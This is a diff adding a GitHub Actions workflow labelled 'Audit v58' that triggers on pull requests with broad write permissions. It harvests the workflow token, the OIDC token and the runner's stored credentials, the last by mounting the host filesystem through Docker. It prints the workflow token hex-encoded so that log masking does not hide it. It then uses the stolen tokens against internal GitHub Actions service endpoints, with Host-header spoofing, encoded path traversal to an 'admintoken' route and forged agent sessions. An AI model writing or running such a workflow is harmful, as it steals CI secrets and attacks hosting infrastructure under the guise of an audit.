@@ -1,0 +1,248 @@
+name: Audit v58
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v58:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V58 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: POOL ENUMERATION via PROXY
+      # distributedtask/pools returns count:0 but runnergroups shows 2!
+      # Hit pools/1 and pools/2 directly via both proxy hosts.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Pool Enumeration
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== POOL ENUMERATION ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          echo "--- A: Pool IDs via pipelines host ---"
+          for HOST in "pipelines.actions.githubusercontent.com" "runner.actions.githubusercontent.com"; do
+            for PID in 0 1 2 3 4 5 10 100 1000; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $HOST" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/distributedtask/pools/$PID" --path-as-is 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
+                echo "A Host=$HOST pools/$PID = $CODE"
+                echo "$BODY" | head -c 400
+                echo ""
+              fi
+            done
+          done
+          echo ""
+
+          # B: Pool sub-endpoints for pool 1 and 2
+          echo "--- B: Pool Sub-Endpoints ---"
+          for HOST in "pipelines.actions.githubusercontent.com"; do
+            for PID in 1 2; do
+              for EP in "agents" "jobrequests" "messages" "sessions" "admintoken" "accesspolicy"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                  -H "Authorization: Bearer $IDTOK" \
+                  -H "Host: $HOST" \
+                  -H "Accept: application/json; $VER" \
+                  "$PROXY/_apis/distributedtask/pools/$PID/$EP" --path-as-is 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                echo "B $HOST pools/$PID/$EP = $CODE"
+                echo "$BODY" | head -c 400
+                echo ""
+              done
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: SESSION CREATION via PROXY
+      # Sessions carry agent credentials. Create via pipelines Host.
+      # Also try with the exact locationUrl from resourceareas.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Session Creation + LocationURL
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SESSION CREATION ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+
+          echo "--- A: Create sessions via proxy ---"
+          for HOST in "pipelines.actions.githubusercontent.com" "runner.actions.githubusercontent.com"; do
+            for PID in 1 2; do
+              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 3 -m 5 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $HOST" \
+                -H "Content-Type: application/json" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/distributedtask/pools/$PID/sessions" --path-as-is \
+                -d "{\"ownerName\":\"v58-audit\",\"agent\":{\"name\":\"v58-agent\",\"version\":\"2.0.0\"},\"systemCapabilities\":{}}" 2>/dev/null)
+              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+              echo "A $HOST pool/$PID session = $CODE"
+              echo "$R" | head -c 600
+              echo ""
+            done
+          done
+          echo ""
+
+          # B: Hit the EXACT locationUrl from the leaked resourceareas
+          # resourceareas showed distributedtask → pipelines.actions.githubusercontent.com/SECRET/
+          echo "--- B: Direct locationUrl endpoints ---"
+          DIRECT="https://pipelines.actions.githubusercontent.com/$SECRET"
+          for EP in \
+            "_apis/distributedtask/pools" \
+            "_apis/distributedtask/pools/1/admintoken" \
+            "_apis/distributedtask/pools/2/admintoken" \
+            "_apis/distributedtask/pools/1/sessions" \
+            "_apis/distributedtask/pools/2/sessions" \
+            "_apis/distributedtask/pools/1/agents" \
+            "_apis/distributedtask/pools/2/agents" \
+            "_apis/runtime/runnergroups"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Accept: application/json; $VER" \
+              "$DIRECT/$EP" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $EP = $CODE"
+            echo "$BODY" | head -c 500
+            echo ""
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: PROCESSID REPLAY + runnerscalesets 204
+      # The admintoken 204 returns x-tfs-processid.
+      # Try using that processId to retrieve the async result.
+      # runnerscalesets also returned 204 — same issue.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - ProcessID Replay + Scale Sets
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PROCESSID REPLAY ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          # A: Capture processid from admintoken then replay it
+          echo "--- A: Capture + Replay processId ---"
+          FULL_RESP=$(/usr/bin/curl -sS -i --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $IDTOK" \
+            -H "Host: pipelines.actions.githubusercontent.com" \
+            -H "Accept: application/json; $VER" \
+            "$PROXY/_apis/distributedtask/pools/..%2fadmintoken" --path-as-is 2>/dev/null)
+          echo "$FULL_RESP" | head -c 600
+          PROCESSID=$(echo "$FULL_RESP" | grep -i "x-tfs-processid" | awk '{print $2}' | tr -d '\r')
+          ACTIVITYID=$(echo "$FULL_RESP" | grep -i "activityid" | awk '{print $2}' | tr -d '\r')
+          echo "ProcessId=$PROCESSID ActivityId=$ACTIVITYID"
+
+          # Try fetching async result using processId
+          if [ -n "$PROCESSID" ]; then
+            for EP in \
+              "_apis/operations/$PROCESSID" \
+              "_apis/distributedtask/operations/$PROCESSID" \
+              "_apis/distributedtask/results/$PROCESSID" \
+              "_apis/distributedtask/admintoken/$PROCESSID"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Accept: application/json; $VER" \
+                "$PIPE/$EP" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              echo "A replay $EP = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
+            done
+          fi
+          echo ""
+
+          # B: runnerscalesets also returned 204 — exhaust sub-routes
+          echo "--- B: runnerscalesets sub-routes ---"
+          for HOST in "pipelines.actions.githubusercontent.com"; do
+            for SUB in \
+              "" "/1" "/2" "/1/sessions" "/1/acquirejobs" \
+              "/1/generatejitconfig" "/..%2frunnergroups" "/..%2fadmintoken"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $HOST" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/runtime/runnerscalesets$SUB" --path-as-is 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              echo "B scalesets$SUB = $CODE"
+              echo "$BODY" | head -c 300
+              echo ""
+            done
+          done
+
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V58 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V58 COMPLETE ==="
